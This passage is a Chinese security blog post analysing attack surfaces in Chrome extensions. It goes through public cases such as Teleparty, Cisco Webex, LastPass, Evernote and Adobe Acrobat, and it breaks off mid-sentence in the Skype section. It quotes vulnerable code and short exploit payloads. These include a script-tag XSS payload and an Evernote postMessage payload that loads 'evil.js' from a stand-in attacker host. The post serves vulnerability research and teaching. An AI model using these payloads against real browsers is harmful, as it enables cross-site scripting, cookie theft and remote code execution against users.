---
title: Chrome扩展攻击指南（二）：漏洞分析
url: https://blog.xlab.app/p/4db211d2/
source: 明天的乌云
date: 2024-11-25
fetch_date: 2025-10-06T19:14:50.674719
---

# Chrome扩展攻击指南（二）：漏洞分析

[明天的乌云](/)

透明人博客

* [首页](/)
* [分类](/categories/)
* [归档](/archives/)
* [日报专栏](https://daily.xlab.app/)
* [我的推荐](/links/)
* [友情链接](/friends/)
* [关于](/about/)
* 搜索

* 文章目录
* 站点概览

1. [1. 漏洞特点](#%E6%BC%8F%E6%B4%9E%E7%89%B9%E7%82%B9)
2. [2. 攻击面分析](#%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90)
3. [3. Content scripts](#Content-scripts)
   1. [3.1. DOM](#DOM)
      1. [3.1.1. Scratch Addons (CVE-2020-26239)](#Scratch-Addons-CVE-2020-26239)
      2. [3.1.2. Teleparty](#Teleparty)
      3. [3.1.3. Video Downloader](#Video-Downloader)
   2. [3.2. DOM Event](#DOM-Event)
      1. [3.2.1. Cisco Webex](#Cisco-Webex)
   3. [3.3. onmessage](#onmessage)
      1. [3.3.1. LastPass](#LastPass)
      2. [3.3.2. Evernote (CVE-2019-12592)](#Evernote-CVE-2019-12592)
      3. [3.3.3. Adobe Acrobat](#Adobe-Acrobat)
   4. [3.4. window.name](#window-name)
      1. [3.4.1. Pop up blocker](#Pop-up-blocker)
   5. [3.5. Web Storage](#Web-Storage)
      1. [3.5.1. Skype](#Skype)
      2. [3.5.2. 彩云小译](#%E5%BD%A9%E4%BA%91%E5%B0%8F%E8%AF%91)
4. [4. Inject scripts](#Inject-scripts)
   1. [4.1. Wappalyzer](#Wappalyzer)
   2. [4.2. Kaspersky (CVE-2019-15687)](#Kaspersky-CVE-2019-15687)
5. [5. Background scripts](#Background-scripts)
   1. [5.1. Web Accessible Resources](#Web-Accessible-Resources)
      1. [5.1.1. 扩展探测](#%E6%89%A9%E5%B1%95%E6%8E%A2%E6%B5%8B)
      2. [5.1.2. Kaspersky (CVE-2019-15684)](#Kaspersky-CVE-2019-15684)
      3. [5.1.3. McAfee WebAdvisor (CVE-2019-3670)](#McAfee-WebAdvisor-CVE-2019-3670)
   2. [5.2. Externally Connectable](#Externally-Connectable)
      1. [5.2.1. Custom Cursor](#Custom-Cursor)
      2. [5.2.2. Screencastify](#Screencastify)
   3. [5.3. Chrome API](#Chrome-API)
6. [6. 攻击链路图](#%E6%94%BB%E5%87%BB%E9%93%BE%E8%B7%AF%E5%9B%BE)
7. 7. 相关文章

![透明人](/images/logo.png)

透明人

Tmr Blog

[197
日志](/archives/)

[33
分类](/categories/)

[159
标签](/tags/)

0%

链接

* [透明日报](https://daily.xlab.app/ "https://daily.xlab.app")

# Chrome扩展攻击指南（二）：漏洞分析

发表于
2024-11-24

分类于

[安全](/categories/%E5%AE%89%E5%85%A8/)
，
[漏洞挖掘](/categories/%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/)

阅读次数：

本文字数：
12k

阅读时长 ≈
11 分钟

结合漏洞案例，分析各组件的攻击面，最终绘制完整的攻击链路图

## 漏洞特点

攻击场景设计是在用户在访问恶意站点，触发漏洞利用

前端漏洞主要还是围绕XSS和CSRF，而在Chrome扩展场景中，漏洞的成因是相似的，但由于漏洞作用的组件不同，导致漏洞的效果也不太一样

由于Content Scripts可在多个站点中执行，XSS可能会变成UXSS

> UXSS(Universal Cross-Site Scripting) 通用XSS，可以在任意网站中实现XSS

但在当前站点中有些特殊，因为有同源策略，CSRF不再成立，因为与网页共享DOM，HTML注入的XSS也没有什么用

在Background中由于没有同源策略，且可以访问Chrome API，XSS可以视为UXSS，CSRF也可以无视同源策略执行

同时在Chrome Manifest V3中规定禁止代码执行，禁止加载远程资源，体现在CSP中无法添加`unsafe-eval`和`unsafe-inline`，也无法添加任何远程地址，导致想要在Manifest V3实现XSS非常困难，不过好在现在大部分还在用Manifest V2（大概75%）

![](/p/4db211d5/target.png)

## 攻击面分析

从历史漏洞中学习，分析攻击面，总结攻击链路，为漏洞挖掘提供思路

但在Chrome扩展研究中存在一个比较大的问题：扩展没有官方提供历史版本，导致难以复现进行研究

但也有人收集历史数据，钱能解决问题

<https://chrome-stats.com/>

下面在此基础上，结合漏洞案例，介绍各组件存在的攻击面，以及相关攻击链路

## Content scripts

`Content scripts`作为最贴近网页的扩展组件，大多数的攻击起点也都是在这里

主要攻击入口有`DOM`元素，事件，`window.name`，`Web Storage`

### DOM

由于`Content scripts`与网页JS共享`DOM`

对于恶意站点来说，攻击入口包括了整个`DOM`

对于目标站点，攻击入口则是该域下所有可控的`DOM`，依赖站点特性，这里不多介绍

#### Scratch Addons (CVE-2020-26239)

`DOM->Content->DOM`

DOM元素的textContent写入outerHTML，导致XSS

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` document.querySelectorAll(".project-description a").forEach((element) => {   if (/\d+/.test(element.textContent)) element.outerHTML = element.textContent; }); ``` |

<https://github.com/ScratchAddons/ScratchAddons/security/advisories/GHSA-6qfq-px3r-xj4p>

#### Teleparty

`DOM->Content`

旧版jQuery处理html时会将`script`的内容传递到`eval`执行

扩展在`Content scripts`中使用`jQuery`处理恶意的`DOM`数据，导致在`Content scripts`中代码执行

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 ``` | ``` const message = msgContainer.data("message"); msgContainer.replaceWith(   jQuery(`     <p>${message.body}</p>   `) ); ``` |

攻击payload如下

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 ``` | ``` <div class="msg"      data-perm-id="rand"      data-user-nickname="hi"      data-message='{"body":"<script>alert(chrome.runtime.id)</script>"}'      data-user-icon="any.svg"> </div> ``` |

<https://palant.info/2022/03/14/party-time-injecting-code-into-teleparty-extension/>

#### Video Downloader

`DOM->Content->Background->Popup DOM`

`Content`在`DOM`中寻找链接，传递给`Background`，并在`Popup`展示用于下载

过滤链接存在绕过，同时`Popup`页面通过拼接HTML渲染页面，导致在`Popup`页面XSS

这个扩展申请了`cookies`，XSS可以调用Chrome API获取所有cookie

申请了所有域权限，`http://*/*`和`https://*/*`，XSS可以无视同源策略发起任意请求

<https://thehackerblog.com/video-download-uxss-exploit-detailed/>

### DOM Event

除了`Content`去直接查询`DOM`元素，还有订阅事件

#### Cisco Webex

`DOM Event->Content->Background->WebEx DLL`

在`document`中监听事件，将事件消息经过一系列转换，最终转发到本机`WebEx`程序

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 ``` | ``` document.addEventListener("connect", function (e) {   console.info("[ContentScript] connect: e=", e),     (p.token_ = e.detail.token),     p.connectPort(chrome.runtime.id); }),   document.addEventListener("message", function (e) {     console.info("[ContentScript] message: e=", e),       p.sendMessage(e.detail, p.handleNativeMessage);   }); ``` |

在`DOM`中构造对应事件数据，最终利用`WebEx`相关DLL功能实现RCE

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 ``` | ``` document.dispatchEvent(   new CustomEvent("connect", { detail: {} }) ); document.dispatchEvent(   new CustomEvent("message", { detail: {} }) ); ``` |

<https://bugs.chromium.org/p/project-zero/issues/detail?id=1096>

<https://bugs.chromium.org/p/project-zero/issues/detail?id=1100>

### onmessage

由于`Content scripts`与网页使用同一个`window`，`postMessage`将直接与`Content scripts`通信

如果没有校验来源，甚至可以利用iframe或者window.open获取目标window，跨域发送消息直达`Content scripts`完成攻击

#### LastPass

`Msg->Content->Background`

未校验来源，直接把消息转发到`Background scripts`

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` window.addEventListener("message", function(e) {     e.data.fromExtension || chrome.runtime.sendMessage(e.data, function(e) {}); }); ``` |

从而调用在`Background scripts`中的丰富功能，甚至包括与本地LassPass程序的RPC通信，从而实现窃取密码/RCE

<https://bugs.chromium.org/p/project-zero/issues/detail?id=1209>

#### Evernote (CVE-2019-12592)

`Msg->Content->DOM`

`Content`监听`message`，最终会根据msg在当前网页的所有`iframe`注入一个js，实现UXSS

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 ``` | ``` window.postMessage({   "type": "EN_request",   "messageID": "clipper-serializer-1",   "name": "EN_installAndSerializerAll",   "data": {     "target": ".targets",     "resuorcePath": "https://hacker.com/evil.js?q="   } }) ``` |

<https://guard.io/blog/evernote-universal-xss-vulnerability>

#### Adobe Acrobat

`XSS->Msg->Content->Background`

为了实现在`documentcloud.adobe.com`中查看PDF，会注入特定的`Content scripts`与`Background scripts`通信，利用`Background scripts`无同源策略，将PDF文件传输到`documentcloud.adobe.com`

`documentcloud.adobe.com`想查看`https://internal/file.pdf`

1. 把链接通过postMessage发给`Content scripts`
2. `Content scripts`把链接发给`Background scripts`
3. `Background scripts`无同源策略限制，`fetch`直接获取文件
4. 一步步回传给`documentcloud.adobe.com`

结合利用`documentcloud.adobe.com`域名下XSS漏洞，实现同源策略绕过

<https://palant.info/2022/04/19/adobe-acrobat-hollowing-out-same-origin-policy/>

### window.name

虽然说`Content`与网页隔离，变量不能共享，但是`window.name`是个例外

#### Pop up blocker

`name->Content`

`window.name`经过一系列编码转换，最终传递到`location.href`，可实现任意重定向

由于利用点是`location`，还可以利用`javascript`协议执行JS

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 ``` | ``` if (window.name && 0 == window.name.indexOf("pp_pending_ntf:")) {   const n = JSON.parse(atob(name.split(":")[1]));   if (n.host !== location.host) {     let o = n.pop.split("|")[0];     location.href = o;   } } ``` |

但是由于这是一个Manifest V3扩展，会被CSP拦截，不能实现实际的攻击

### Web Storage

在Web中使用存储有

1. `localStorage`
2. `sessionStorage`
3. `indexedDB`
4. `Web SQL`

如果在`Content`中使用Web Storage，其实是在使用当前网站的存储，而不是扩展程序自己的

写入Web Storage存在信息泄露，同时读取Web Storage也是用户输入

有时使用Web Storage并不是扩展本身的意愿，而是扩展程序使用的依赖库在使用Web Storage

在`Background`中，由于有自己的页面，所以是存储在扩展中，不过在Chrome扩展中推荐使用的Chrome API提供的存储能力

1. `chrome.storage.local`
2. `chrome.storage.sync`
3. `chrome.storage.session`
4. `chrome.storage.managed`

#### Skype

在页面中点击Skype扩展时，`Content`会将`userId`存储在`sessionStorage`中，恶意网站可在自己的sessionStorag...